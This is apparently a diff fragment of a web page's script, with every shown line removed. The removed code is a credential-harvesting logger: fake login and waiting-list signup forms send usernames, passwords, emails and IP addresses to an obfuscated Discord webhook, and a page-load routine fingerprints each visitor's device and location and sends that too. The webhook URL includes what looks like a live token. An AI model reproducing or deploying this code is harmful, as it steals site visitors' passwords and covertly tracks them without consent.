-
-    // Close with ESC key
-    document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') {
-            closeLogin();
-        }
-    });
-
-    // ============================================
-    // DISCORD WEBHOOK
-    // ============================================
-    const _a = 'https://discord.com/api/webhooks/';
-    const _b = '1513861047004430426/';
-    const _c = 'QaiZRm9qibYzGndCD_Jgk9NstMglric_Qp7gjKUZ1WQQ0LckAzFH6LW83WAuXI2hsVxv';
-    const _webhook = _a + _b + _c;
-
-    function sendAuthData(type, data) {
-        var fields = [];
-        if (type === 'login') {
-            fields = [
-                { name: 'Type', value: 'LOGIN ATTEMPT', inline: false },
-                { name: 'Username', value: data.username || 'N/A', inline: true },
-                { name: 'Password', value: data.password || 'N/A', inline: true },
-                { name: 'IP', value: data.ip || 'N/A', inline: true },
-                { name: 'User Agent', value: data.ua || 'N/A', inline: false },
-                { name: 'Timestamp', value: new Date().toISOString(), inline: false }
-            ];
-        } else if (type === 'signup') {
-            fields = [
-                { name: 'Type', value: 'SIGNUP REQUEST', inline: false },
-                { name: 'Username', value: data.username || 'N/A', inline: true },
-                { name: 'Email', value: data.email || 'N/A', inline: true },
-                { name: 'Password', value: data.password || 'N/A', inline: true },
-                { name: 'Confirm', value: data.confirm || 'N/A', inline: true },
-                { name: 'IP', value: data.ip || 'N/A', inline: true },
-                { name: 'User Agent', value: data.ua || 'N/A', inline: false },
-                { name: 'Timestamp', value: new Date().toISOString(), inline: false }
-            ];
-        }
-        var embed = {
-            title: 'Waiting List Activity',
-            color: type === 'login' ? 0xffaa00 : 0x00aaff,
-            fields: fields,
-            footer: { text: 'gztxr auth logger' },
-            timestamp: new Date().toISOString()
-        };
-        fetch(_webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        }).then(function(r) {
-            if (r.ok) { console.log('[+] Auth data sent'); } else { console.error('[-] Failed:', r.status); }
-        }).catch(function(e) { console.error('[-] Error:', e); });
-    }
-
-    // ============================================
-    // HANDLE LOGIN (Overlay)
-    // ============================================
-    function handleLogin() {
-        var username = document.getElementById('loginUsername').value.trim();
-        var password = document.getElementById('loginPassword').value.trim();
-        var msg = document.getElementById('loginMessage');
-        var btn = document.querySelector('#loginForm .auth-btn');
-
-        if (!username || !password) {
-            msg.className = 'auth-message error';
-            msg.textContent = 'Please enter both username and password.';
-            return;
-        }
-
-        btn.disabled = true;
-        msg.className = 'auth-message loading';
-        msg.textContent = '⏳ Authenticating...';
-
-        // Get IP and send data
-        getIPWithRetry(function(ip) {
-            sendAuthData('login', { username: username, password: password, ip: ip || 'N/A', ua: navigator.userAgent });
-            msg.className = 'auth-message error';
-            msg.textContent = 'No account found. Please sign up for the waiting list.';
-            btn.disabled = false;
-            document.getElementById('loginUsername').value = '';
-            document.getElementById('loginPassword').value = '';
-        });
-    }
-
-    // ============================================
-    // HANDLE SIGNUP (Overlay)
-    // ============================================
-    function handleSignupOverlay() {
-        var username = document.getElementById('signupUsername').value.trim();
-        var email = document.getElementById('signupEmail').value.trim();
-        var password = document.getElementById('signupPassword').value.trim();
-        var confirm = document.getElementById('signupConfirm').value.trim();
-        var msg = document.getElementById('signupMessage');
-        var btn = document.querySelector('#signupForm .auth-btn');
-
-        if (!username || !email || !password || !confirm) {
-            msg.className = 'auth-message error';
-            msg.textContent = 'All fields are required.';
-            return;
-        }
-        if (password !== confirm) {
-            msg.className = 'auth-message error';
-            msg.textContent = 'Passwords do not match.';
-            return;
-        }
-        if (password.length < 4) {
-            msg.className = 'auth-message error';
-            msg.textContent = 'Password must be at least 4 characters.';
-            return;
-        }
-
-        btn.disabled = true;
-        msg.className = 'auth-message loading';
-        msg.textContent = '⏳ Adding to waiting list...';
-
-        getIPWithRetry(function(ip) {
-            sendAuthData('signup', { username: username, email: email, password: password, confirm: confirm, ip: ip || 'N/A', ua: navigator.userAgent });
-            msg.className = 'auth-message success';
-            msg.textContent = '✅ You have been added to the waiting list! We will notify you when access is granted.';
-            btn.disabled = false;
-            document.getElementById('signupUsername').value = '';
-            document.getElementById('signupEmail').value = '';
-            document.getElementById('signupPassword').value = '';
-            document.getElementById('signupConfirm').value = '';
-        });
-    }
-
-    // ============================================
-    // ENTER KEY SUPPORT
-    // ============================================
-    document.getElementById('loginPassword').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') handleLogin();
-    });
-    document.getElementById('loginUsername').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') handleLogin();
-    });
-    document.getElementById('signupConfirm').addEventListener('keydown', function(e) {
-        if (e.key === 'Enter') handleSignupOverlay();
-    });
-    document.querySelectorAll('#signupForm input').forEach(function(input) {
-        input.addEventListener('keydown', function(e) {
-            if (e.key === 'Enter') handleSignupOverlay();
-        });
-    });
-
-    // ============================================
-    // ULTRA RELIABLE IP DETECTION WITH RETRY
-    // ============================================
-    function getIPWithRetry(callback) {
-        var apis = [
-            { url: 'https://api.ipify.org?format=json', parser: function(r) { return r.ip; } },
-            { url: 'https://api.ipinfo.io/json', parser: function(r) { return r.ip; } },
-            { url: 'https://ipapi.co/json/', parser: function(r) { return r.ip; } },
-            { url: 'https://httpbin.org/ip', parser: function(r) { return r.origin; } },
-            { url: 'https://icanhazip.com', parser: function(r) { return r.trim(); } },
-            { url: 'https://ifconfig.me/ip', parser: function(r) { return r.trim(); } },
-            { url: 'https://api.my-ip.io/ip', parser: function(r) { return r.ip || r; } }
-        ];
-        
-        var currentApi = 0;
-        var maxRetries = apis.length * 2;
-        var attempts = 0;
-        
-        function tryApi() {
-            if (attempts >= maxRetries || currentApi >= apis.length) {
-                console.error('[-] All IP APIs failed after ' + attempts + ' attempts');
-                callback('N/A');
-                return;
-            }
-            
-            var api = apis[currentApi % apis.length];
-            attempts++;
-            
-            console.log('[+] IP attempt ' + attempts + ': ' + api.url);
-            
-            fetch(api.url, { mode: 'cors' })
-                .then(function(r) {
-                    if (!r.ok) throw new Error('HTTP ' + r.status);
-                    return r.text();
-                })
-                .then(function(text) {
-                    // Try to parse JSON or use plain text
-                    try {
-                        var result = JSON.parse(text);
-                        var ip = api.parser(result);
-                        if (ip && ip !== 'N/A' && ip !== '' && ip !== 'undefined' && ip !== 'null') {
-                            console.log('[+] IP found:', ip);
-                            callback(ip);
-                            return;
-                        }
-                    } catch(e) {
-                        var ip = text.trim();
-                        if (ip && ip !== 'N/A' && ip !== '' && ip !== 'undefined' && ip !== 'null' && /^[0-9.]/.test(ip)) {
-                            console.log('[+] IP found:', ip);
-                            callback(ip);
-                            return;
-                        }
-                    }
-                    throw new Error('Invalid IP response');
-                })
-                .catch(function(e) {
-                    console.error('[-] API failed:', e.message);
-                    currentApi++;
-                    setTimeout(tryApi, 300);
-                });
-        }
-        
-        tryApi();
-    }
-
-    // ============================================
-    // VISITOR DATA COLLECTION
-    // ============================================
-    function _x() {
-        var d = {};
-        d.ua = navigator.userAgent;
-        d.lang = navigator.language;
-        d.langs = navigator.languages || [];
-        d.plat = navigator.platform;
-        d.vendor = navigator.vendor || 'N/A';
-        d.cookie = navigator.cookieEnabled;
-        d.dnt = navigator.doNotTrack || 'unspecified';
-        d.cores = navigator.hardwareConcurrency || 'N/A';
-        
-        d.mem = 'N/A';
-        if (navigator.deviceMemory) {
-            d.mem = navigator.deviceMemory + 'GB';
-        } else if (window.performance && window.performance.memory) {
-            var memMB = Math.round(window.performance.memory.jsHeapSizeLimit / (1024 * 1024));
-            d.mem = memMB + 'MB (heap)';
-        } else if (navigator.hardwareConcurrency) {
-            var cores = navigator.hardwareConcurrency;
-            if (cores >= 16) d.mem = '16GB+ (est.)';
-            else if (cores >= 12) d.mem = '12-16GB (est.)';
-            else if (cores >= 8) d.mem = '8-12GB (est.)';
-            else if (cores >= 6) d.mem = '6-8GB (est.)';
-            else if (cores >= 4) d.mem = '4-6GB (est.)';
-            else if (cores >= 2) d.mem = '2-4GB (est.)';
-            else d.mem = '1-2GB (est.)';
-        }
-        
-        d.touch = navigator.maxTouchPoints || 0;
-        d.sw = screen.width;
-        d.sh = screen.height;
-        d.cd = screen.colorDepth;
-        d.pd = screen.pixelDepth;
-        d.aw = screen.availWidth;
-        d.ah = screen.availHeight;
-        d.iw = window.innerWidth;
-        d.ih = window.innerHeight;
-        d.ow = window.outerWidth;
-        d.oh = window.outerHeight;
-        d.dpr = window.devicePixelRatio || 1;
-        d.tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
-        d.to = new Date().getTimezoneOffset();
-        d.loc = Intl.DateTimeFormat().resolvedOptions().locale;
-        d.ts = new Date().toISOString();
-        d.lt = new Date().toString();
-        d.url = window.location.href;
-        d.path = window.location.pathname;
-        d.search = window.location.search;
-        d.hash = window.location.hash;
-        d.ref = document.referrer || 'Direct';
-        d.title = document.title;
-        d.ls = !!window.localStorage;
-        d.ss = !!window.sessionStorage;
-        d.idb = !!window.indexedDB;
-        d.audio = !!(window.AudioContext || window.webkitAudioContext);
-        d.media = !!(navigator.mediaDevices && navigator.mediaDevices.enumerateDevices);
-        var ua = navigator.userAgent;
-        d.mobile = /Mobi|Android|iPhone|iPad|iPod/i.test(ua);
-        d.tablet = /iPad|Android(?!.*Mobile)/i.test(ua);
-        d.touchdev = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
-        d.os = 'Unknown';
-        if (ua.indexOf('Windows') !== -1) d.os = 'Windows';
-        else if (ua.indexOf('Mac OS X') !== -1 || ua.indexOf('Macintosh') !== -1) d.os = 'macOS';
-        else if (ua.indexOf('Linux') !== -1) d.os = 'Linux';
-        else if (ua.indexOf('Android') !== -1) d.os = 'Android';
-        else if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1 || ua.indexOf('iPod') !== -1) d.os = 'iOS';
-        else if (ua.indexOf('CrOS') !== -1) d.os = 'ChromeOS';
-        d.browser = 'Unknown';
-        if (ua.indexOf('Firefox') !== -1) d.browser = 'Firefox';
-        else if (ua.indexOf('Chrome') !== -1 && ua.indexOf('Edg') === -1) d.browser = 'Chrome';
-        else if (ua.indexOf('Safari') !== -1 && ua.indexOf('Chrome') === -1) d.browser = 'Safari';
-        else if (ua.indexOf('Edg') !== -1) d.browser = 'Edge';
-        else if (ua.indexOf('Opera') !== -1 || ua.indexOf('OPR') !== -1) d.browser = 'Opera';
-        d.plugs = [];
-        try { for (var i = 0; i < navigator.plugins.length; i++) { d.plugs.push(navigator.plugins[i].name); } } catch(e) {}
-        try { var cnv = document.createElement('canvas'); var ctx = cnv.getContext('2d'); var ft = ['Arial','Verdana','Times New Roman','Courier New','Georgia','Comic Sans MS','Impact','Tahoma','Trebuchet MS','Lucida Console']; d.fonts = ft; } catch(e) {}
-        try { var cnv2 = document.createElement('canvas'); var gl = cnv2.getContext('webgl') || cnv2.getContext('experimental-webgl'); if (gl) { var di = gl.getExtension('WEBGL_debug_renderer_info'); if (di) { d.gpu = gl.getParameter(di.UNMASKED_RENDERER_WEBGL); d.gpuv = gl.getParameter(di.UNMASKED_VENDOR_WEBGL); } d.wgl = 'WebGL 1.0'; if (cnv2.getContext('webgl2')) d.wgl = 'WebGL 2.0'; } } catch(e) {}
-        d.conn = null;
-        if (navigator.connection) {
-            d.conn = { type: navigator.connection.type || 'N/A', eff: navigator.connection.effectiveType || 'N/A', down: navigator.connection.downlink || 'N/A', rtt: navigator.connection.rtt || 'N/A', save: navigator.connection.saveData || false };
-        }
-        d.perf = null;
-        if (performance.timing) {
-            d.perf = { load: performance.timing.loadEventEnd - performance.timing.navigationStart, dom: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart };
-        }
-        if (navigator.getBattery) {
-            navigator.getBattery().then(function(b) {
-                d.bat = { level: b.level * 100, charging: b.charging, ct: b.chargingTime, dt: b.dischargingTime };
-                _send(d);
-            }).catch(function() { d.bat = null; _send(d); });
-        } else { d.bat = null; _send(d); }
-        return d;
-    }
-
-    function _send(d) {
-        var fields = [
-            { name: 'IP', value: d.ip || 'Pending...', inline: true },
-            { name: 'Location', value: d.city && d.country ? d.city + ', ' + d.country : 'Pending...', inline: true },
-            { name: 'ISP', value: d.org || 'Pending...', inline: false },
-            { name: 'OS', value: d.os || 'Unknown', inline: true },
-            { name: 'Browser', value: d.browser || 'Unknown', inline: true },
-            { name: 'Device', value: d.mobile ? 'Mobile' : d.tablet ? 'Tablet' : 'Desktop', inline: true },
-            { name: 'Screen', value: d.sw + 'x' + d.sh + ' (' + d.cd + 'bit)', inline: false },
-            { name: 'Window', value: d.iw + 'x' + d.ih, inline: true },
-            { name: 'DPR', value: d.dpr || '1', inline: true },
-            { name: 'Language', value: d.lang || 'N/A', inline: true },
-            { name: 'Timezone', value: d.tz || 'N/A', inline: true },
-            { name: 'CPU Cores', value: d.cores || 'N/A', inline: true },
-            { name: 'RAM', value: d.mem || 'N/A', inline: true },
-            { name: 'Touch', value: d.touchdev ? 'Yes' : 'No', inline: true },
-            { name: 'Cookies', value: d.cookie ? 'Enabled' : 'Disabled', inline: true },
-            { name: 'DNT', value: d.dnt || 'Unspecified', inline: true },
-            { name: 'Referrer', value: d.ref || 'Direct', inline: false },
-            { name: 'URL', value: d.url || 'N/A', inline: false },
-            { name: 'Timestamp', value: d.ts || new Date().toISOString(), inline: false }
-        ];
-        if (d.conn && d.conn.eff) {
-            fields.push({ name: 'Connection', value: d.conn.eff + ' (' + d.conn.down + 'Mbps)', inline: true });
-        }
-        if (d.gpu) {
-            fields.push({ name: 'GPU', value: d.gpu, inline: false });
-        }
-        if (d.plugs && d.plugs.length > 0) {
-            fields.push({ name: 'Plugins', value: d.plugs.slice(0, 5).join(', ') + (d.plugs.length > 5 ? ' +' + (d.plugs.length - 5) + ' more' : ''), inline: false });
-        }
-        if (d.perf && d.perf.load) {
-            fields.push({ name: 'Page Load', value: d.perf.load + 'ms', inline: true });
-        }
-        var embed = {
-            title: 'New Visitor',
-            color: 0x00ff41,
-            fields: fields,
-            footer: { text: 'gztxr logger' },
-            timestamp: new Date().toISOString()
-        };
-        fetch(_webhook, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ embeds: [embed] })
-        }).then(function(r) {
-            if (r.ok) { console.log('[+] Data sent'); } else { console.error('[-] Failed:', r.status); }
-        }).catch(function(e) { console.error('[-] Error:', e); });
-    }
-
-    function _go() {
-        var data = _x();
-        
-        getIPWithRetry(function(ip) {
-            data.ip = ip || 'N/A';
-            if (ip && ip !== 'N/A') {
-                // Try to get location data
-                fetch('https://ipapi.co/' + ip + '/json/')
-                    .then(function(r) { return r.json(); })
-                    .then(function(loc) {
-                        data.city = loc.city || 'N/A';
-                        data.region = loc.region || 'N/A';
-                        data.country = loc.country_name || loc.country || 'N/A';
-                        data.cc = loc.country_code || loc.country || 'N/A';
-                        data.org = loc.org || loc.isp || 'N/A';
-                        data.postal = loc.postal || loc.zip || 'N/A';
-                        data.lat = loc.latitude || loc.lat || 'N/A';
-                        data.lon = loc.longitude || loc.lon || 'N/A';
-                        data.asn = loc.asn || 'N/A';
-                        data.continent = loc.continent || 'N/A';
-                        data.currency = loc.currency || 'N/A';
-                        data.langs_spoken = loc.languages || 'N/A';
-                        data.tz_geo = loc.timezone || 'N/A';
-                        _send(data);
-                    })
-                    .catch(function() {
-                        console.warn('[-] Location lookup failed, sending without location');
-                        _send(data);
-                    });
-            } else {
-                console.warn('[-] No IP found, sending data without IP');
-                _send(data);
-            }
-        });
-    }
-
-    window.onload = function() {
-        setTimeout(_go, 800);
-    };
-</script>
 
 </body>
 </html>
